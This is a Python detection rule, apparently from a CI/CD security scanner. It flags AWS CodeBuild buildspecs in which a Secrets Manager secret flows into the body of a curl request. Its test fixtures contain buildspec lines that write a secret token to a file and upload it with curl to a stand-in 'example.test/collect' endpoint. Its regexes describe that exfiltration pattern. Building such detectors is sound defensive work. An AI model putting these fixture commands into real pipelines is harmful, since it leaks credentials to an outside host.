"""Source-bound CodeBuild Secrets Manager value to a curl body."""

from __future__ import annotations

import re
import tempfile
from dataclasses import dataclass
from pathlib import Path

from taintly.models import IncompletePatternMatches, Platform, Rule, Severity
from taintly.parsers.structural import Event, EventKind, walk_workflow
from taintly.parsers.structural.tokenizer import TokenKind, tokenize
from taintly.rules._secret_network_shell import (
    _BODY_CANDIDATE,
    _Flow,
    _physical_source,
    analyze_shell_rows,
)

_PHASE_ORDER = ("install", "pre_build", "build", "post_build")
_EXECUTION_ENV = frozenset(
    {
        "PATH",
        "SHELL",
        "BASH_ENV",
        "ENV",
        "IFS",
        "CDPATH",
        "HOME",
        "SHELLOPTS",
        "BASHOPTS",
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "CURL_HOME",
        "XDG_CONFIG_HOME",
    }
)
_PHASE_FILE = r"[A-Za-z0-9_][A-Za-z0-9_.-]*"
_PHASE_WRITE = re.compile(
    rf"""printf[ \t]+(?:'%s'|"%s")[ \t]+"""
    rf"""(?:'[^'\r\n]*'|"[^"\\\x60$\r\n]*"|"\$(?:[A-Za-z_][A-Za-z0-9_]*|{{[A-Za-z_][A-Za-z0-9_]*}})")"""
    rf"[ \t]*>>?[ \t]*{_PHASE_FILE}"
)
_PHASE_URL = r"https?://[A-Za-z0-9.-]+(?::[0-9]+)?(?:/[A-Za-z0-9_/.-]*)?"
_PHASE_BODY = rf"--data-binary[ \t]+@{_PHASE_FILE}"
_PHASE_CURL = re.compile(
    rf"curl[ \t]+(?:{_PHASE_BODY}[ \t]+{_PHASE_URL}|{_PHASE_URL}[ \t]+{_PHASE_BODY})"
)


def _literal_rows(command: Event, source_lines: list[str]) -> tuple[tuple[int, str], ...] | None:
    rows = command.block_lines
    if command.value_kind != "block_literal" or not rows or len(rows) > 60:
        return None
    if any(
        line < 1
        or line > len(source_lines)
        or not source_lines[line - 1].rstrip().endswith(raw.rstrip())
        for line, raw in rows
    ):
        return None
    if "\n".join(raw for _, raw in rows).rstrip("\n") != (command.value or "").rstrip("\n"):
        return None
    return rows


def _phase_rows(
    commands: list[Event], events: tuple[Event, ...], source_lines: list[str]
) -> tuple[tuple[tuple[int, str], ...], dict[int, str], str | None]:
    """Admit distinct owned literal blocks and straight-line file effects."""
    phases = [str(command.path[1]) for command in commands]
    if (
        not phases
        or any(phase not in _PHASE_ORDER for phase in phases)
        or len(phases) != len(set(phases))
    ):
        return (), {}, "multiple or missing command items need state analysis"

    keys = [event.path for event in events if event.kind is EventKind.MAP_KEY]
    if len(set(keys)) != len(keys):
        return (), {}, "duplicate mapping keys make phase ownership ambiguous"
    declared_phases = {key[1] for key in keys if len(key) == 2 and key[0] == "phases"}
    if declared_phases != set(phases) or any(command.path[3] != 0 for command in commands):
        return (), {}, "each declared phase needs one source-owned command block"
    for key in keys:
        if key == ("run-as",) or (
            len(key) >= 3 and key[0] == "phases" and key[2:] != ("commands",)
        ):
            return (), {}, "phase execution overrides are outside the ordered file profile"
        if (
            len(key) == 3
            and key[0] == "env"
            and (key[2] in _EXECUTION_ENV or str(key[2]).startswith("BASH_FUNC_"))
        ):
            return (), {}, "environment may change shell or curl command identity"

    rows: list[tuple[int, str]] = []
    owners: dict[int, str] = {}
    for command in sorted(commands, key=lambda event: _PHASE_ORDER.index(str(event.path[1]))):
        block = _literal_rows(command, source_lines)
        if block is None:
            return (), {}, "source-corresponding literal command blocks are required"
        for line, raw in block:
            text = raw.strip()
            if (
                text
                and not text.startswith("#")
                and text not in {"set -eu", "set -e", "set +x"}
                and not _PHASE_WRITE.fullmatch(text)
                and not _PHASE_CURL.fullmatch(text)
            ):
                return (), {}, f"unsupported ordered shell operation at line {line}"
            rows.append((line, raw))
            owners[line] = str(command.path[1])
    return tuple(rows), owners, None


@dataclass(frozen=True)
class _Notes:
    notes: tuple[str, ...]


class CodeBuildSecretNetworkPattern:
    def check(self, content: str, _lines: list[str]):
        if "secrets-manager" in content and _BODY_CANDIDATE.search(content):
            return IncompletePatternMatches(
                [], reason="SEC6-CB-003 physical buildspec source is required"
            )
        return []

    def self_test_check(self, sample: str):
        with tempfile.TemporaryDirectory() as root:
            path = Path(root) / "buildspec.yml"
            path.write_text(sample, encoding="utf8")
            return self.check_with_filepath(sample, sample.splitlines(), str(path))

    def self_test_mutation_applicable(self, source: str, mutant: str, operator: str) -> bool:
        if operator == "quote_swap":
            # A shell variable changes to literal bytes when only its
            # operand quotes change. Static quote swaps still run.
            source_rows, mutant_rows = source.splitlines(), mutant.splitlines()
            if len(source_rows) == len(mutant_rows):
                changed = [
                    (old, new)
                    for old, new in zip(source_rows, mutant_rows, strict=True)
                    if old != new
                ]
                if len(changed) == 1:
                    old, new = changed[0]
                    token = re.search(r"""(?<= )(["'])(\$[A-Za-z_][A-Za-z0-9_]*)\1(?=\s*>)""", old)
                    if token is not None and _PHASE_WRITE.fullmatch(old.strip()):
                        quote = "'" if token[1] == '"' else '"'
                        if (
                            new
                            == old[: token.start()] + quote + token[2] + quote + old[token.end() :]
                        ):
                            return False
        if operator != "whitespace_pad":
            return True

        def owners(text: str) -> set[tuple[object, ...]] | None:
            events = tuple(walk_workflow("buildspec.yml", content=text, include_keys=True))
            if any(event.kind in {EventKind.ERROR, EventKind.CUTOFF} for event in events):
                return None
            return {
                event.path
                for event in events
                if event.kind is EventKind.LEAF_SCALAR
                and (
                    event.path in {("version",), ("env", "shell")}
                    or event.path[:2] == ("env", "secrets-manager")
                    or (
                        len(event.path) == 4
                        and event.path[:1] == ("phases",)
                        and event.path[2] == "commands"
                    )
                )
            }

        before, after = owners(source), owners(mutant)
        return not before or (after is not None and before <= after)

    def _analyze(self, content: str, filepath: str):
        if not ("secrets-manager" in content and _BODY_CANDIDATE.search(content)):
            return [], {}, None
        digest = _physical_source(filepath, content)
        if digest is None:
            return [], {}, "SEC6-CB-003 source identity is unavailable"
        events = tuple(walk_workflow(filepath, content=content, include_keys=True, recover=True))
        try:
            tokens = tuple(tokenize(content))
        except Exception:
            return [], {}, "SEC6-CB-003 YAML tokenization is incomplete"
        if any(
            event.kind in {EventKind.ERROR, EventKind.CUTOFF} or event.merge_origins
            for event in events
        ) or any(
            token.kind in {TokenKind.ALIAS, TokenKind.ANCHOR, TokenKind.MERGE_KEY}
            for token in tokens
        ):
            return [], {}, "SEC6-CB-003 candidate structure is ambiguous"
        leaves = [event for event in events if event.kind is EventKind.LEAF_SCALAR]
        paths = [event.path for event in leaves]
        if len(paths) != len(set(paths)):
            return [], {}, "SEC6-CB-003 duplicate source paths"
        values = {event.path: event for event in leaves}
        if values.get(("version",)) is None or values[("version",)].value != "0.2":
            return [], {}, "SEC6-CB-003 buildspec version 0.2 is required"
        if values.get(("env", "shell")) is None or values[("env", "shell")].value != "bash":
            return [], {}, "SEC6-CB-003 explicit Bash shell is required"
        sources = {
            str(event.path[2]): event
            for event in leaves
            if len(event.path) == 3
            and event.path[:2] == ("env", "secrets-manager")
            and isinstance(event.path[2], str)
            and re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", event.path[2])
            and event.value
        }
        if not sources:
            return [], {}, "SEC6-CB-003 secret binding could not be resolved"
        if any(
            ("env", other, name) in values
            for name in sources
            for other in ("variables", "parameter-store")
        ):
            return [], {}, "SEC6-CB-003 buildspec variable source is overridden"
        commands = [
            event
            for event in leaves
            if len(event.path) == 4
            and event.path[0] == "phases"
            and event.path[2] == "commands"
            and type(event.path[3]) is int
        ]
        source_lines = content.splitlines()
        ordered = len(commands) != 1
        if ordered:
            rows, phase_at, issue = _phase_rows(commands, events, source_lines)
            if issue:
                return [], {}, f"SEC6-CB-003 {issue}"
        else:
            command = commands[0]
            single = _literal_rows(command, source_lines)
            if single is None:
                return [], {}, "SEC6-CB-003 source-corresponding literal command block is required"
            rows = single
            phase_at = dict.fromkeys((line for line, _ in rows), str(command.path[1]))
        initial = {name: _Flow(frozenset({f"secrets-manager:{name}"}), ()) for name in sources}
        flows, stopped = analyze_shell_rows(rows, initial, allow_printf=ordered)
        matches: list[tuple[int, str]] = []
        notes: dict[tuple[int, str], str] = {}
        for line, body, flow in flows:
            item = (line, body)
            matches.append(item)
            bindings = ", ".join(sorted(flow.secrets))
            hops = " -> ".join(
                f"{phase_at[number]} {kind} line {number}" if ordered else f"{kind} line {number}"
                for number, kind in flow.hops
            )
            origins = (
                "; declared binding at "
                + ", ".join(
                    f"line {sources[name.split(':', 1)[1]].line}" for name in sorted(flow.secrets)
                )
                if ordered
                else ""
            )
            notes[item] = (
                f"Source SHA256 {digest}; CodeBuild {phase_at[line]} phase; {bindings} "
                f"reaches curl body via {hops}{origins}. Build/project overrides, secret retrieval, "
                "execution, destination trust and delivery are unknown."
                + (
                    " Phase success and a shared, unchanged file location are assumed for this path."
                    if ordered
                    else ""
                )
            )
        return (
            matches,
            notes,
            (
                "SEC6-CB-003 candidate path stopped at unsupported shell operation"
                if stopped
                else None
            ),
        )

    def check_with_filepath(self, content: str, _lines: list[str], filepath: str):
        matches, _notes, incomplete = self._analyze(content, filepath)
        return IncompletePatternMatches(matches, reason=incomplete) if incomplete else matches

    def context_notes_for_matches(
        self, content: str, filepath: str, matches: list[tuple[int, str]]
    ):
        _matches, notes, _incomplete = self._analyze(content, filepath)
        return [_Notes((notes[item],)) if item in notes else None for item in matches]


_SAMPLE = (
    "version: 0.2\nenv:\n  shell: bash\n  secrets-manager:\n    TOKEN: prod/token\n"
    "phases:\n  build:\n    commands:\n      - |\n"
    "        echo $TOKEN > token.txt\n"
    "        curl https://example.test/collect --data-binary @token.txt\n"
)

_ORDERED_SAMPLE = (
    "version: 0.2\nenv:\n  shell: bash\n  secrets-manager:\n    TOKEN: fixture/token\n"
    "phases:\n  install:\n    commands:\n      - |\n"
    "        printf '%s' \"$TOKEN\" > payload.txt\n"
    "  post_build:\n    commands:\n      - |\n"
    "        printf '%s' 'public suffix' >> payload.txt\n"
    "        curl --data-binary @payload.txt https://example.test/collect\n"
)


RULES = [
    Rule(
        id="SEC6-CB-003",
        title="CodeBuild secret may reach an outbound HTTP request body",
        severity=Severity.MEDIUM,
        platform=Platform.CODEBUILD,
        owasp_cicd="CICD-SEC-6",
        description="A source-bound Secrets Manager variable reaches a curl request body through a bounded CodeBuild 0.2 Bash command block or through supported literal file operations in native phase order.",
        pattern=CodeBuildSecretNetworkPattern(),
        remediation="Review whether the endpoint is intended to receive this secret. If not, remove the body transfer; if delivery is confirmed, investigate the build and rotate the affected secret.",
        reference="https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html",
        test_positive=[_SAMPLE, _ORDERED_SAMPLE],
        test_negative=[
            _SAMPLE.replace("--data-binary @token.txt", '-H "Authorization: Bearer $TOKEN"'),
            _ORDERED_SAMPLE.replace(">> payload.txt", "> payload.txt"),
        ],
        finding_family="credential_exposure",
        confidence="medium",
        review_needed=True,
    )
]
